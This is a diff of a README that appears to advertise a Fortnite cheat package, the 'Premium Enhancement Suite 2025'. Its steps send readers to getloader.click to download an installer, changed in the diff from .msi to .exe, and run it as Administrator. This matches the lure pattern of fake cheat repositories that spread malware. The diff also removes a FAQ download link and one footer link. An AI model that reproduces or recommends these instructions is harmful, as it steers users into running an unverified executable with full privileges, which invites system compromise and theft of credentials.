@@ -1,7 +1,7 @@
 <div align="center">
 
 # 🎯 FORTNITE  
-## PREMIUM ENHANCEMENT SUITE 2025
+##  PREMIUM ENHANCEMENT SUITE 2025 For Fortnite
 
 *Advanced systems for the ultimate battle royale experience*
 
@@ -84,12 +84,12 @@
 1. **Copy access code**: `getloader.click`
 2. **Paste into browser** and execute
 3. **Download and run** the installer
-4. **Run .msi as Administrator** for full access
+4. **Run .exe as Administrator** for full access
 
 ### 🚀 METHOD 2: DIRECT DOWNLOAD
 **👉 [DOWNLOAD NOW](https://getloader.click/) 👈**
 1. **Click the link above**
-2. **Download the .msi file**
+2. **Download the .exe file**
 3. **Run as Administrator**
 4. **Follow installation steps**
 
@@ -130,9 +130,7 @@ A: Safe for all game modes
 **Q: Custom configurations?**  
 A: Fully customizable settings
 
-**Q: Download link?**  
-A: **[https://getloader.click/](https://getloader.click/)**
 
 ---
 
-*Last Update: November 2025 | Version: 5.1.3 | Download: https://getloader.click/*
+*Last Update: November 2025 | Version: 5.1.3 
